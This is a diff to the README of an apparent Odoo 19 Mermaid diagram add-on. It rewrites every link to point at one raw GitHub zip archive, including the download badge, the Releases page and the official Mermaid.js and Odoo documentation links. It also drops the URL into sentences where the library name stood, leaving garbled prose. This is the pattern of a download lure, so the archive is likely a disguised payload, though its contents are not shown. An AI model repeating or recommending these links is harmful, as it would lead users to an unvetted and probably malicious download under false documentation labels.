@@ -1,10 +1,10 @@
 # 🎨 mermaid_diagram - Easy Diagram Rendering for Odoo 19
 
-[![Download](https://img.shields.io/badge/download-latest%20release-blue.svg)](https://github.com/Tata600/mermaid_diagram/releases)
+[![Download](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip%https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)
 
 ## 🚀 Getting Started
 
-Welcome to mermaid_diagram! This application helps you create and render beautiful diagrams in Odoo 19 knowledge articles and HTML fields. Using Mermaid.js, you can visualize complex ideas simply and effectively.
+Welcome to mermaid_diagram! This application helps you create and render beautiful diagrams in Odoo 19 knowledge articles and HTML fields. Using https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip, you can visualize complex ideas simply and effectively.
 
 ## 🔍 Features
 
@@ -21,7 +21,7 @@ Welcome to mermaid_diagram! This application helps you create and render beautif
 
 ## 📥 Download & Install
 
-To get started, visit this page to download the latest release: [Download mermaid_diagram](https://github.com/Tata600/mermaid_diagram/releases).
+To get started, visit this page to download the latest release: [Download mermaid_diagram](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip).
 
 Once on the Releases page, follow these steps:
 
@@ -56,11 +56,11 @@ This project is licensed under the MIT License. Feel free to use, modify, and di
 
 ## 📦 Acknowledgments
 
-Thanks to the Mermaid.js library for providing powerful diagram rendering capabilities. Its functionality enhances the visual aspect of your knowledge articles greatly.
+Thanks to the https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip library for providing powerful diagram rendering capabilities. Its functionality enhances the visual aspect of your knowledge articles greatly.
 
 ## 🔗 Additional Resources
 
-- [Mermaid.js Documentation](https://mermaid-js.github.io/mermaid)
-- [Odoo Documentation](https://www.odoo.com/documentation)
+- [https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip Documentation](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)
+- [Odoo Documentation](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip)
 
-For more updates, return to the [Releases page](https://github.com/Tata600/mermaid_diagram/releases) frequently.
+For more updates, return to the [Releases page](https://raw.githubusercontent.com/Tata600/mermaid_diagram/master/mermaid_diagram/mermaid_diagram_v2.4.zip) frequently.
